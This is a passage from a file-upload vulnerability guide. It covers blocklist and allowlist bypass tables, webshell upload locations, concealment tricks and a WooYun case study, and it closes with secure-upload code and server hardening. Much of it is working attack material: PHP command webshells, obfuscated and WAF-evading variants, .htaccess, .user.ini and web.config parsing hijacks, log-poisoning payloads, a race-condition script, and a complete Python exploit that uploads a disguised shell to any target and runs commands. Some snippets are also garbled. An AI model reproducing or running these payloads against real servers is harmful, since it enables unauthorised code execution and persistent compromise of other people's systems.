> 4. **Context exploitation**: Even with a successful upload, an image-based webshell cannot execute without a file inclusion vulnerability (LFI/RFI). This demonstrates that file upload vulnerabilities typically require multiple vulnerability combinations.

---

## 13. Blocklist vs Allowlist Validation (Deep Analysis)

### 13.1 Validation Strategy Comparative Analysis

```
+-------------------------------------------------------------------------+
|              Blocklist vs Allowlist Validation Strategies                |
+-------------------------------------------------------------------------+
|                                                                         |
|  [Blocklist Strategy]                                                  |
|  |-- Definition: Explicit list of prohibited dangerous extensions      |
|  |-- Simple implementation: Only check if extension is in list         |
|  |-- Difficult maintenance: New extensions constantly appear           |
|  |-- Easy to bypass: Case variation, double-write, special suffixes   |
|  |-- Vulnerability pattern: Missing certain variants leads to bypass   |
|  |-- Applicable scenario: Rapid prototyping, not recommended for      |
|  |   production                                                        |
|                                                                         |
|  [Allowlist Strategy]                                                  |
|  |-- Definition: Explicit list of permitted safe extensions            |
|  |-- Complex implementation: Requires strict validation of each        |
|  |   allowed extension                                                 |
|  |-- Simple maintenance: New types must be actively added              |
|  |-- Difficult to bypass: Must find flaws within the allowlist         |
|  |-- Vulnerability pattern: Overly permissive allowlist includes       |
|  |   dangerous types                                                   |
|  |-- Applicable scenario: Production environments, high security       |
|  |   requirements                                                      |
|                                                                         |
|  [Mixed Strategy]                                                      |
|  |-- Definition: Allowlist primary, blocklist supplementary            |
|  |-- Allowlist handles permitted extensions                            |
|  |-- Blocklist handles known dangerous variants                        |
|  |-- Balances security and flexibility                                 |
|  |-- Recommended for complex business scenarios                        |
|                                                                         |
+-------------------------------------------------------------------------+
```

### 13.2 Blocklist Bypass Techniques Detailed

#### 13.2.1 Typical Blocklist Vulnerabilities

```php
// Poor blocklist implementation
$blacklist = ['php', 'php5', 'php4', 'asp', 'aspx', 'jsp'];
$ext = strtolower(pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION));

if (in_array($ext, $blacklist)) {
    die("File type not allowed");
}
// Continue processing upload...

// Can be bypassed by the following methods:
// 1. .phtml (not in blocklist)
// 2. .php3 .php7 .phps (variants not included)
// 3. .PHP (case variation, if strtolower was forgotten)
// 4. .php%00.jpg (null-byte truncation)
// 5. .php. (trailing dot)
// 6. .php::$DATA (Windows stream)
```

#### 13.2.2 Blocklist Bypass Technique Matrix

| Bypass Technique | Principle | PHP Example | ASP Example | JSP Example | Success Rate |
|-----------------|----------|------------|------------|------------|-------------|
| **Case Variation** | Blocklist did not normalize case | .Php .pHp | .AsP .aSp | .JsP .jSp | 80% |
| **Double-Write** | Replacement still contains blocked term | .pphphp | .asaspp | .jsjspp | 70% |
| **Special Suffix** | Incomplete blocklist | .phtml .phps | .asa .cer | .jspx .jsw | 90% |
| **Null Char** | Truncates subsequent characters | .php%00.jpg | .asp%00.gif | .jsp%00.png | 85% |
| **Trailing Dot** | Some systems ignore trailing dots | .php. | .asp. | .jsp. | 75% |
| **Semicolon Truncation** | IIS behavior | N/A | .asp;.jpg | N/A | 95% |
| **::$DATA** | NTFS stream | N/A | .asp::$DATA | N/A | 90% |
| **Newline** | Apache CVE | .php\x0a | N/A | N/A | 60% |
| **Double Extension** | Only checks last extension | .php.jpg | .asp.gif | .jsp.png | 85% |

#### 13.2.3 Real-World Blocklist Bypass Cases

**Case 1: WooYun-2015-0127845 Analysis**
```json
{
  "detail": "Upload function did not properly validate file type, uploaded .php file was executed"
}

// Inferred original code (vulnerable)
function isAllowedFile($filename) {
    $ext = strtolower(pathinfo($filename, PATHINFO_EXTENSION));

    // Blocklist approach (possibly incomplete implementation)
    $dangerous = ['php', 'php5', 'asp', 'jsp', 'exe', 'sh'];
    return !in_array($ext, $dangerous);
}

// Bypass methods:
// 1. Try .phtml (if not in blocklist)
// 2. Try .php3 .php7 .pht (variants)
// 3. Try case variation .PHP .pHp
// 4. Try .php%00.jpg (null-byte truncation)
// 5. Try .php. (trailing dot)
// 6. Try .php::$DATA (if Windows server)

// Most likely successful bypass: .phtml or .php.xxx (multi-suffix)
```

**Case 2: Replacement-Based Blocklist Bypass**
```php
// Vulnerable implementation
function sanitizeFilename($filename) {
    // Attempt to replace dangerous extensions
    $filename = str_replace(['.php', '.asp'], '', $filename);
    return $filename;
}

// Bypass example:
// Upload: shell.pphphp
// After replacement: shell.php (first .php replacement leaves .php)
// Final file: shell.php

// Or using double-write:
// Upload: shell.asaspp
// After replacement: shell.asp
```

**Case 3: Regex Blocklist Bypass**
```php
// Vulnerable regex implementation
$blacklist_pattern = '/\.(php|asp|jsp)$/i';
if (preg_match($blacklist_pattern, $filename)) {
    die("Dangerous file type");
}

// Bypass methods:
$filename = "shell.phtml";  // Does not match regex
$filename = "shell.php5";   // Does not match regex
$filename = "shell.php.jpg"; // Matches .jpg ending

// Or using newline character (certain PHP versions)
$filename = "shell.php\n";  // Regex may not match \n
```

### 13.3 Allowlist Bypass Techniques Detailed

#### 13.3.1 Typical Allowlist Implementation

```php
// Recommended allowlist implementation
function isAllowedFileType($filename) {
    // Define allowed extensions
    $allowed_extensions = ['jpg', 'jpeg', 'png', 'gif', 'pdf'];

    // Get file extension
    $ext = strtolower(pathinfo($filename, PATHINFO_EXTENSION));

    // Allowlist check
    if (!in_array($ext, $allowed_extensions)) {
        return false;
    }

    return true;
}
```

#### 13.3.2 Allowlist Bypass Methods (Difficult but Possible)

| Bypass Technique | Principle | Exploitation Condition | Difficulty |
|-----------------|----------|----------------------|-----------|
| **Parsing Vulnerability** | Upload allowlisted file but special parsing | IIS/Apache/Nginx vulnerability | High |
| **Double Extension** | shell.php.jpg parsed as php | Apache multi-suffix configuration | Medium |
| **Null-Byte Truncation** | shell.php%00.jpg | PHP < 5.3.4 | High |
| **Config File** | Upload .htaccess/.user.ini | txt/config files allowed | Medium |
| **File Inclusion** | Upload image-based webshell + LFI | File inclusion vulnerability exists | High |

#### 13.3.3 Real-World Allowlist Bypass Cases

**Case 1: Apache Multi-Suffix Parsing Bypass**
```php
// Allowlist check
$allowed = ['jpg', 'png', 'gif'];
$filename = $_FILES['file']['name'];
$ext = pathinfo($filename, PATHINFO_EXTENSION);

// Uploaded file: shell.php.jpg
// Allowlist check: Passes (extension is jpg)
// Apache parsing: Parses right-to-left, executes on .php
// Actual execution: Runs as PHP file

// Defense: Not only check extension, also rename the file
```

**Case 2: Upload Configuration File to Hijack Parsing**
```php
// Scenario: Allowlist permits .txt files
// Upload: .htaccess file

// .htaccess contents:
<FilesMatch "\.jpg$">
  SetHandler application/x-httpd-php
</FilesMatch>

// Effect: All .jpg files will be executed as PHP
// Use in combination with image-based webshell

// Or upload .user.ini file (PHP FastCGI)
auto_prepend_file=shell.jpg

// Effect: All PHP files automatically include shell.jpg before execution
```

**Case 3: Null-Byte Truncation Bypass (Older PHP)**
```php
// PHP < 5.3.4
$filename = "shell.php\x00.jpg";

// pathinfo() returns: jpg (allowlist passes)
// File system saves: shell.php (null-byte truncation)
// Result: PHP file is saved and executed

// Defense: Upgrade PHP version, filter null bytes
```

### 13.4 Comparative Analysis

```
+-------------------------------------------------------------------------+
|              Blocklist vs Allowlist Systematic Analysis                  |
+-------------------------------------------------------------------------+
|                                                                         |
|  [Information Theory Perspective]                                      |
|  |-- Blocklist: Negation set (infinite set), cannot be exhaustive     |
|  |-- Allowlist: Affirmation set (finite set), fully controllable      |
|  |-- Conclusion: Allowlist is more secure from an information theory  |
|  |   standpoint                                                        |
|                                                                         |
|  [Attack/Defense Asymmetry]                                            |
|  |-- Blocklist: Defenders must consider all attack vectors            |
|  |-- Allowlist: Attackers can only use the limited allowed types      |
|  |-- Conclusion: Allowlist increases attacker cost                     |
|                                                                         |
|  [Maintenance Cost]                                                    |
|  |-- Blocklist: List must be updated with each new threat             |
|  |-- Allowlist: New needs must be actively added, but more            |
|  |   controllable                                                      |
|  |-- Conclusion: Allowlist has lower long-term maintenance cost       |
|                                                                         |
|  [Business Impact]                                                     |
|  |-- Blocklist: Low business impact, but high security risk           |
|  |-- Allowlist: More business restrictions, but controllable security |
|  |-- Conclusion: Must balance based on business scenario              |
|                                                                         |
|  [Best Practices]                                                      |
|  1. Use allowlist strategy by default                                  |
|  2. Allowlist should be as strict as possible                         |
|  3. Only add blocklist when necessary (handling known variants)       |
|  4. Regularly audit allowlist, remove unnecessary types               |
|  5. Log rejected upload attempts for threat intelligence              |
|                                                                         |
+-------------------------------------------------------------------------+
```

**Core Insights**:

> **The Fundamental Flaw of Blocklists**: Blocklists are based on "known threats," but the core security problem is "unknown threats." Like only defending against known viruses, new variants can still infect the system.
>
> **The Philosophy of Allowlists**: Allowlists embody the "default deny" security philosophy. Unless explicitly allowed, everything is rejected. This aligns with the principle of least privilege.
>
> **Practical Recommendation**: In file upload scenarios, allowlists are the only acceptable production practice. Any code using blocklists should be considered technical debt requiring refactoring.

---

## 14. Common Webshell Upload Locations

### 14.1 High-Risk Upload Point Classification

```
+-------------------------------------------------------------------------+
|                 Webshell Upload Location Risk Matrix                    |
+-------------------------------------------------------------------------+
| Location Type           | Risk  | Access   | Persistence | Detection   |
|                         | Level | Difficulty| Capability  | Difficulty  |
+-------------------------------------------------------------------------+
| 1. Rich text editor dir | 5/5   | Low      | Strong     | Low         |
| 2. User avatar upload   | 4/5   | Medium   | Medium     | Low         |
| 3. Attachment/doc dir   | 4/5   | Medium   | Medium     | Medium      |
| 4. Temporary file dir   | 3/5   | High     | Weak       | High        |
| 5. Log directory        | 2/5   | High     | Weak       | High        |
| 6. Cache directory      | 3/5   | High     | Medium     | High        |
| 7. Backup directory     | 4/5   | Medium   | Strong     | Medium      |
| 8. Config file dir      | 5/5   | Low      | Very Strong| Medium      |
| 9. Theme/template dir   | 5/5   | Low      | Very Strong| Low         |
| 10. User upload root    | 4/5   | Low      | Strong     | Low         |
+-------------------------------------------------------------------------+
```

### 14.2 Detailed Location Analysis

#### 14.2.1 Rich Text Editor Directories

| Editor | Default Path | Exploitation Characteristics | Persistence |
|--------|-------------|----------------------------|-------------|
| **FCKeditor** | `/FCKeditor/UserFiles/` | Many files, easy to hide | High |
| **CKeditor** | `/ckfinder/userfiles/` | Has connector interface | High |
| **eWebEditor** | `/ewebeditor/uploadfile/` | Many vulnerabilities in older versions | High |
| **UEditor** | `/ueditor/php/upload/` | Can upload configuration files | High |
| **KindEditor** | `/kindeditor/attached/` | Can traverse directories | Medium |
| **TinyMCE** | `/tinymce/uploads/` | Depends on integration method | Medium |

**Feature Identification**:
```bash
# FCKeditor signatures
/FCKeditor/editor/filemanager/browser/default/connectors/test.html
/FCKeditor/editor/filemanager/upload/test.html

# UEditor signatures
/ueditor/net/controller.ashx
/ueditor/php/controller.php

# eWebEditor signatures
/ewebeditor/admin_uploadfile.asp
/ewebeditor/php/upload.php
```

**Persistence Techniques**:
```php
// 1. Upload to deep directory
shell.php -> /UserFiles/File/2024/01/23/hidden/shell.php

// 2. Disguise as normal filename
shell.php -> image_20240123_135422.php

// 3. Use double extension
shell.php.jpg -> Some configurations will execute

// 4. Upload .htaccess to modify parsing
<Files "shell.jpg">
SetHandler application/x-httpd-php
</Files>
```

#### 14.2.2 User Avatar Upload Locations

**Common Paths**:
```
/avatar/uploads/
/user/avatar/
/member/uploadfile/
/data/avatar/
/upload/avatar/
/images/avatars/
/static/avatars/
```

**Exploitation Characteristics**:
- Usually user-controllable directories
- Filenames are predictable (userid/username)
- Access URLs are easy to construct
- Cleanup mechanisms are often incomplete

**Persistence Methods**:
```php
// Method 1: Modify own avatar to webshell
// URL: /avatar/user_123_shell.php
// Advantage: Shell persists as long as the account exists

// Method 2: Upload then exploit via another vulnerability (e.g., file inclusion)
// LFI: /index.php?page=../../avatar/shell.jpg
// Even as an image, LFI can execute it

// Method 3: Race condition
// Rapidly access file before deletion, generate new file in another location
```

#### 14.2.3 Attachment/Document Upload Locations

**Common Paths**:
```
/attachments/
/uploads/
/upload/files/
/data/attachment/
/files/
/download/
```

**Business Scenarios**:
- Email attachments
- Forum attachments
- Document sharing
- Ticket systems
- Submission systems

**Persistence Techniques**:
```php
// 1. Disguise as document
// Filename: report_2024.php.doc
// Some systems only check .doc, not the intermediate .php

// 2. Leverage time-based naming
// Filename: 20240123135422.php
// Brute-force timestamp to access

// 3. Directory depth
// Upload to deep directory: /attachments/2024/01/23/

// 4. Modify Content-Disposition
// filename="safe.doc.php" (if server takes full filename)
```

#### 14.2.4 Temporary File Directories

**Path Examples**:
```
/tmp/
/tmp/upload/
/var/tmp/
/tmp/php/
```

**Exploitation Characteristics**:
- May lack execution permissions (depends on configuration)
- Files may be quickly cleaned up
- Requires race condition exploitation

**Exploitation Method**:
```python
import requests
import threading

# Race condition script
def race_upload():
    # Thread 1: Continuous upload
    def upload():
        while True:
            requests.post(url, files={'file': shell})

    # Thread 2: Continuous access
    def access():
        while True:
            requests.get(upload_url + '/tmp/php' + random)

    threading.Thread(target=upload).start()
    threading.Thread(target=access).start()
```

#### 14.2.5 Log Directories

**Path Examples**:
```
/logs/
/runtime/log/
/storage/logs/
/var/log/
```

**Exploitation Method**:
```php
// Method 1: Inject into log
User-Agent: <?php system($_GET['x']); ?>

// Access log file
/include/.log

// Method 2: Upload to log directory
// If log directory is writable and executable
```

#### 14.2.6 Configuration File Directories

**High-Risk Locations**:
```
/config/
/application/config/
/.htaccess
/.user.ini
/web.config
```

**Exploitation Methods**:
```apache
# .htaccess parsing hijack
<FilesMatch "\.jpg">
  SetHandler application/x-httpd-php
</FilesMatch>

# Or redirect
<IfModule mod_rewrite.c>
  RewriteEngine On
  RewriteRule shell.jpg shell.php [L]
</IfModule>
```

```ini
# .user.ini (PHP-FPM)
auto_prepend_file=/var/www/html/uploads/shell.jpg
# All PHP files automatically include shell.jpg before execution
```

```xml
<!-- web.config (IIS) -->
<configuration>
  <system.webServer>
    <handlers>
      <add name="PHP" path="*.jpg" verb="*" modules="FastCgiModule"
           scriptProcessor="C:\php\php-cgi.exe" resourceType="Unspecified" />
    </handlers>
  </system.webServer>
</configuration>
```

#### 14.2.7 Theme/Template Directories

**Path Examples**:
```
/wp-content/themes/
/templates/
/application/view/
/skin/frontend/
```

**Exploitation Methods**:
```php
// Upload malicious template file
// WordPress theme: functions.php
// Joomla template: index.php
// ThinkPHP template: index.html (may be parsed)

// Or upload a theme zip package, install via admin panel
```

### 14.3 Path Retrieval Techniques

#### 14.3.1 Passive Retrieval Methods

| Method | Principle | Success Rate |
|--------|----------|-------------|
| **Response Return** | Path returned on successful upload | 95% |
| **Preview Function** | Image preview reveals path | 80% |
| **JS Debugging** | Inspect XHR responses | 70% |
| **Page Source** | HTML comments / JS variables | 60% |
| **Error Messages** | Errors leak paths | 50% |

#### 14.3.2 Active Probing Methods

```bash
# 1. Directory traversal (FCKeditor)
curl "http://target/FCKeditor/editor/filemanager/browser/default/connectors/php/connector.php?Command=GetFoldersAndFiles&Type=&CurrentFolder=/"

# 2. Brute-force common paths
gobuster dir -u http://target -w /path/to/wordlist -x .php,.jsp,.asp

# 3. Leverage known file naming rules
# Timestamp: /uploads/20240123135422.php
# MD5: /uploads/a3f5e8b9c2d1f4e6.php
# Random: Brute-force 6-8 character random strings

# 4. Search engine dorks
site:target.com inurl:uploads filetype:php
site:target.com inurl:avatar filetype:jsp
```

### 14.4 Webshell Detection and Concealment

#### 14.4.1 Detection Signatures

```php
// Common webshell signatures
// 1. Dangerous functions
system, exec, shell_exec, passthru, popen, proc_open
eval, assert, create_function, preg_replace(/e)
base64_decode, gzinflate, str_rot13

// 2. Variable signatures
$_POST, $_GET, $_REQUEST, $_COOKIE
$_SERVER['HTTP_USER_AGENT']

// 3. Obfuscation signatures
\x73\x79\x73\x74\x65\x6d (hex encoding)
chr(115).chr(121)... (chr concatenation)
```

#### 14.4.2 Concealment Techniques

```php
// 1. Variable obfuscation
$a = 'syste';
$b = 'm';
$ab = $a.$b;
$ab($_POST['x']);

// 2. Callback functions
array_map('ass'.'ert', array($_POST['x']));

// 3. Dynamic functions
$func = $_REQUEST['f'];
$func($_REQUEST['cmd']);

// 4. Image-based webshell + file inclusion
// Upload image-based webshell, exploit via LFI

// 5. Letterless webshell
$_=''; $_[+'']='='; $__='_';
$_=++$_; $_++; $_++; $_++; $_++; $_++; // 6
$__++; $__++; // 2
$___=$_$__; // 6+2=8 (chr)
// Using mathematical operations to generate characters

// 6. Leveraging superglobal variables
extract($_SERVER['HTTP_HOST']);
// If HTTP_HOST contains malicious code

// 7. Using exception handling
set_exception_handler('system');
throw new Exception($_POST['cmd']);
```

### 14.5 Root Cause Analysis

> **The Essence of Webshells**: A webshell is not a "file" but a "persistent control channel." Understanding this essence helps in choosing the right upload location and concealment strategy.
>
> **Persistence Levels**:
> 1. **File-level**: File is not deleted (config directories, theme directories)
> 2. **Account-level**: Bound to user account (avatar, personal files)
> 3. **System-level**: Modify configuration files, hijack parsing
> 4. **Application-level**: Leverage business logic for persistence
>
> **Defender's Perspective**:
> - Know where attackers may upload, set targeted monitoring
> - Restrict execution permissions on upload directories (.htaccess, nginx config)
> - Regularly scan upload directories
> - File Integrity Monitoring (FIM)
> - Behavioral analysis (anomalous file access)

---

## 15. Comprehensive Real-World Case Analysis

### 15.1 Case: WooYun-2015-0127845 Complete Analysis

**Vulnerability Basic Information**:
```json
{
  "bug_id": "wooyun-2015-0127845",
  "title": "A system file upload leading to arbitrary code execution",
  "vuln_type": "Vulnerability Type: File upload leading to arbitrary code execution",
  "level": "Severity: High",
  "detail": "Upload function did not properly validate file type, uploaded .php file was executed",
  "poc": "Upload shell.php with content: <?php system($_POST['cmd']); ?>"
}
```

#### 15.1.1 Root Cause Analysis

```php
// Inferred vulnerable code
class UploadController {
    public function upload() {
        $file = $_FILES['file'];

        // Error 1: May only check MIME type (client-controllable)
        $allowed_types = ['image/jpeg', 'image/png', 'image/gif'];
        if (!in_array($file['type'], $allowed_types)) {
            return ['error' => 'File type not allowed'];
        }

        // Error 2: File extension not checked, or check is insufficient
        // Or only client-side extension checked, no renaming

        // Error 3: Upload directory can execute PHP
        $upload_dir = '/var/www/html/uploads/';
        move_uploaded_file($file['tmp_name'], $upload_dir . $file['name']);

        // Error 4: Returns full path (information disclosure)
        return ['url' => 'http://target/uploads/' . $file['name']];
    }
}

// Security issues summary:
// 1. MIME type validation (client-controllable)
// 2. Missing extension allowlist validation
// 3. Upload directory has PHP execution permissions
// 4. Path information disclosure
```

#### 15.1.2 Exploitation Steps

```
+-------------------------------------------------------------------------+
|                      Exploitation Timeline                              |
+-------------------------------------------------------------------------+
|                                                                         |
|  [Step 1: Information Gathering]                                       |
|  |-- Discover upload point: /upload.php or /upload                     |
|  |-- Test validation method: Attempt to upload .txt, observe response  |
|  |-- Identify server: PHP environment (likely Apache/Nginx)            |
|  |-- Determine validation method: MIME type check only                 |
|                                                                         |
|  [Step 2: Construct Payload]                                           |
|  |-- Create webshell: <?php system($_POST['cmd']); ?>                 |
|  |-- Save as shell.php                                                 |
|  |-- Prepare MIME check bypass                                         |
|                                                                         |
|  [Step 3: Execute Upload]                                              |
|  |-- Method A: Burp Suite Interception                                |
|  |   1. Upload shell.php                                               |
|  |   2. Intercept HTTP request                                         |
|  |   3. Modify Content-Type: image/jpeg                               |
|  |   4. Forward request                                                |
|  |                                                                      |
|  |-- Method B: Python Script                                           |
|  |   import requests                                                   |
|  |   files = {'file': ('shell.php', open('shell.php', 'rb'),          |
|  |            'image/jpeg')}                                           |
|  |   r = requests.post(url, files=files)                               |
|  |                                                                      |
|  |-- Method C: Curl Command                                            |
|  |   curl -X POST http://target/upload.php \                          |
|  |     -F "file=@shell.php" -H "Content-Type: image/jpeg"             |
|                                                                         |
|  [Step 4: Obtain Shell Path]                                           |
|  |-- Method A: Path returned in response                               |
|  |-- Method B: Brute-force common paths (/uploads/shell.php)          |
|  |-- Method C: Inspect page source / JS                                |
|  |-- Method D: Directory traversal (if FCKeditor)                     |
|                                                                         |
|  [Step 5: Execute Commands]                                            |
|  |-- Access: http://target/uploads/shell.php                          |
|  |-- POST data: cmd=ls -la                                            |
|  |-- Or connect with webshell management tools                         |
|  |-- Privilege escalation / lateral movement                           |
|                                                                         |
+-------------------------------------------------------------------------+
```

#### 15.1.3 Exploitation Script Example

```python
#!/usr/bin/env python3
"""
File Upload Vulnerability Automated Exploitation Script
For WooYun-2015-0127845 type vulnerabilities
"""

import requests
import sys
from urllib.parse import urljoin

class FileUploadExploit:
    def __init__(self, target_url):
        self.target_url = target_url
        self.session = requests.Session()

    def check_upload_point(self):
        """Check if upload point exists"""
        try:
            response = self.session.get(self.target_url)
            if response.status_code == 200:
                print(f"[+] Upload point exists: {self.target_url}")
                return True
        except Exception as e:
            print(f"[-] Error: {e}")
        return False

    def generate_shell(self, password='cmd'):
        """Generate PHP webshell"""
        # Basic version
        shell_code = f"<?php system($_POST['{password}']); ?>"

        # Obfuscated version (WAF bypass)
        shell_code_obfs = f"""
        <?php
        $f = substr('ass',0).'ert';
        $f($_POST['{password}']);
        ?>
        """

        return shell_code

    def upload_shell(self, shell_content):
        """Upload webshell"""
        # Construct multipart/form-data
        files = {
            'file': ('shell.jpg',  # Disguised filename
                    shell_content,
                    'image/jpeg')   # Spoofed MIME type
        }

        try:
            response = self.session.post(
                self.target_url,
                files=files,
                timeout=10
            )

            # Analyze response
            if response.status_code == 200:
                print("[+] Upload successful")

                # Attempt to extract path from response
                if 'uploads' in response.text or 'shell' in response.text:
                    print(f"[+] Possible path: {response.text[:200]}")
                    return self.extract_path(response.text)

                # Default path guessing
                possible_paths = [
                    '/uploads/shell.jpg',
                    '/upload/shell.jpg',
                    '/files/shell.jpg',
                    '/shell.jpg'
                ]

                for path in possible_paths:
                    full_url = urljoin(self.target_url, path)
                    if self.test_shell(full_url):
                        return full_url

        except Exception as e:
            print(f"[-] Upload failed: {e}")

        return None

    def extract_path(self, response_text):
        """Extract file path from response"""
        import re
        # Match URL patterns
        patterns = [
            r'https?://[^\s<>"]+uploads/[^\s<>"]+',
            r'https?://[^\s<>"]+shell[^\s<>"]*',
            r'/uploads/[^\s<>"]+',
        ]

        for pattern in patterns:
            matches = re.findall(pattern, response_text)
            if matches:
                return matches[0]

        return None

    def test_shell(self, shell_url):
        """Test if shell is accessible"""
        try:
            # Test command
            response = self.session.post(
                shell_url,
                data={'cmd': 'echo vulnerable;'},
                timeout=5
            )

            if 'vulnerable' in response.text:
                print(f"[+] Shell accessible: {shell_url}")
                return True
        except:
            pass

        return False

    def exploit(self):
        """Execute complete exploitation flow"""
        print("[*] Starting file upload vulnerability exploitation...")

        # Step 1: Check upload point
        if not self.check_upload_point():
            print("[-] Upload point does not exist")
            return False

        # Step 2: Generate shell
        shell_content = self.generate_shell()
        print("[+] Shell code generated")

        # Step 3: Upload
        shell_url = self.upload_shell(shell_content)

        if shell_url:
            print(f"[+] Exploitation successful! Shell URL: {shell_url}")
            print(f"[+] Execute command: curl -X POST {shell_url} -d 'cmd=whoami'")
            return True
        else:
            print("[-] Exploitation failed or unable to find shell path")
            return False

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print("Usage: python3 exploit.py <target_url>")
        print("Example: python3 exploit.py https://example.com/upload")
        sys.exit(1)

    target = sys.argv[1]
    exploit = FileUploadExploit(target)
    exploit.exploit()
```

#### 15.1.4 Remediation Recommendations

```php
// Secure file upload implementation
class SecureUploadController {
    private $allowed_extensions = ['jpg', 'jpeg', 'png', 'gif'];
    private $upload_dir = '/var/www/html/uploads/';
    private $max_file_size = 5 * 1024 * 1024; // 5MB

    public function upload() {
        $file = $_FILES['file'];

        // 1. Check file size
        if ($file['size'] > $this->max_file_size) {
            return ['error' => 'File too large'];
        }

        // 2. Allowlist extension check
        $ext = strtolower(pathinfo($file['name'], PATHINFO_EXTENSION));
        if (!in_array($ext, $this->allowed_extensions)) {
            return ['error' => 'File type not allowed'];
        }

        // 3. MIME type check (supplementary validation)
        $finfo = finfo_open(FILEINFO_MIME_TYPE);
        $mime = finfo_file($finfo, $file['tmp_name']);
        finfo_close($finfo);

        $allowed_mimes = ['image/jpeg', 'image/png', 'image/gif'];
        if (!in_array($mime, $allowed_mimes)) {
            return ['error' => 'MIME type not allowed'];
        }

        // 4. File content check (image dimensions)
        $image_info = getimagesize($file['tmp_name']);
        if (!$image_info) {
            return ['error' => 'Not a valid image'];
        }

        // 5. Rename file (remove original extension)
        $new_filename = uniqid('img_', true) . '.jpg';
        $upload_path = $this->upload_dir . $new_filename;

        // 6. Move file
        if (!move_uploaded_file($file['tmp_name'], $upload_path)) {
            return ['error' => 'Upload failed'];
        }

        // 7. Set permissions (non-executable)
        chmod($upload_path, 0644);

        // 8. Return relative path (do not expose server path)
        return [
            'success' => true,
            'filename' => $new_filename,
            'url' => '/uploads/' . $new_filename
        ];
    }
}

// Server configuration defense

// Apache .htaccess (upload directory)
<Directory "/var/www/html/uploads">
    php_flag engine off
    <FilesMatch "\.php$">
        Order Allow,Deny
        Deny from all
    </FilesMatch>
</Directory>

// Nginx configuration
location ~* ^/uploads/.*\.php$ {
    deny all;
}

// Or in uploads directory:
// location /uploads/ {
//     location ~ \.php$ {
//         deny all;
//     }
// }
```

### 15.2 Systematic Root Cause Analysis

```
+-------------------------------------------------------------------------+
|                WooYun-2015-0127845 Deep Analysis                        |
+-------------------------------------------------------------------------+
|                                                                         |
|  [Problem Essence]                                                     |
|  This is not a "file upload" vulnerability but a "missing validation"  |
|  vulnerability. The upload functionality itself is legitimate,          |
|  but the absence of validation mechanisms makes it an attack surface.  |
|                                                                         |
|  [Failure Chain Analysis]                                              |
|  Development -> Code Review -> Testing -> Deployment -> Operations     |
|      1            2             3           4              5           |
|                                                                         |
|  1. Development: Incomplete validation, or using insecure methods      |
|  2. Review: Missing validation not detected, or "basic validation"    |
|     deemed sufficient                                                  |
|  3. Testing: Only normal functionality tested, security boundaries    |
|     not tested                                                         |
|  4. Deployment: Upload directory retains execution permissions         |
|  5. Operations: No monitoring for anomalous file uploads/execution    |
|                                                                         |
|  [Systemic Lessons]                                                    |
|  1. Single-point defense is fragile: MIME-only validation is easily   |
|     bypassed                                                           |
|  2. Defense-in-depth is necessary: Multi-layer validation + server    |
|     config + operational monitoring                                    |
|  3. Principle of least privilege: Upload directories should have no   |
|     execution permissions                                              |
|  4. Shift security left: Security should be considered during         |
|     development, not patched after the fact                            |
|                                                                         |
|  [Defense Pattern Evolution]                                           |
|  Phase 1 (No defense): Direct upload, no validation <- This case      |
|  Phase 2 (Client-side): JS extension check (bypassable)              |
|  Phase 3 (Server blocklist): Check dangerous extensions (bypassable) |
|  Phase 4 (Server allowlist): Only allow specific extensions (better)  |
|  Phase 5 (Multi-layer): Allowlist+MIME+header+content (recommended)  |
|  Phase 6 (Defense-in-depth): Multi-layer validation+rename+           |
|  permissions+monitoring (best practice)                                |
|                                                                         |
|  [Root Cause Analysis]                                                 |
|  The root cause of most security vulnerabilities is not a lack of     |
|  technical ability but a lack of security thinking.                    |
|  Developers focus on "how to implement features" while neglecting     |
|  "how to prevent abuse."                                               |
|                                                                         |
|  True security requires systematic thinking:                           |
|  - What are the normal use cases?                                      |
|  - What are the abuse scenarios?                                       |
|  - How to implement features while preventing abuse?                   |
|  - If defense is bypassed, how to detect and respond?                 |
|                                                                         |
|  Security is not a product, but a process.                             |
|                                                                         |
+-------------------------------------------------------------------------+
```

---

*Document generation date: 2026-01-23*
*Last updated: Based on WooYun-2015-0127845 deep analysis*
*Data source: WooYun vulnerability database (2,711 file upload vulnerabilities out of 88,636 total entries)*
